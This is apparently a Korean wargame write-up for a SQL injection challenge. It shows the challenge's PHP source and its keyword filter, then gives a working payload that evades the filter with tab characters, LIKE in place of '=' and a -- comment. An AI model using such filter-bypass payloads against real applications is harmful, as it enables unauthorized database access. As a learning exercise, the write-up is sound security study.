# sql

```php
<?php
  include "../../config.php";
  if($_GET['view_source']) view_source();
?><html>
<head>
<title>Challenge 27</title>
</head>
<body>
<h1>SQL INJECTION</h1>
<form method=get action=index.php>
<input type=text name=no><input type=submit>
</form>
<?php
  if($_GET['no']){
  $db = dbconnect();
  if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
  $r=mysqli_fetch_array(mysqli_query($db,"select id from chall27 where id='guest' and no=({$_GET['no']})")) or die("query error");
  if($r['id']=="guest") echo("guest");
  if($r['id']=="admin") solve(27); // admin's no = 2
}
?>
<br><a href=?view_source=1>view-source</a>
</body>
</html>
```

필터링부분을 보자

```php
if(preg_match("/#|select|\(| |limit|=|0x/i",$_GET['no'])) exit("no hack");
```

`#, select, (, 공백, limit, =, 0x` 이런 애들이 필터링된다. 

쿼리를 보자

```sql
select id from chall27 where id='guest' and no=({$_GET['no']})")
```

참고하는 컬럼은 id와 no이다. id는 guest, admin, no는 각각 1, 2이다. 
앞에 설정된 guest는 무시하고, no로만 불러올 수 있다. 

`or no=2` 이걸 넣어야 한다. 
하지만, 공백, = 모두 필터링이 된다. 인풋을 받는 괄호도 닫아 주어야 한다. 

9) or no like 2 -- 이렇게 해서 앞에 괄호를 닫아주고, like로 =을 대체한다. 뒤에 오는 쿼리를 무시하기위해 #대신 -- 를 쓴다. 
그리고, 공백 넣으면 안되니까, 탭키를 삽입한다. 

```sql
2)%09or%09no%09like%092%09--%09
```

그럼 해결



> 이런류의 sql injection은 단순하잖아. 
> 필터링 문자를 우회하는 것.
>
> 근데도 아직은 sql에 대한 지식이 부족해서 인지.. 
> 우회방법이 바로바로 떠오르지 않는다. 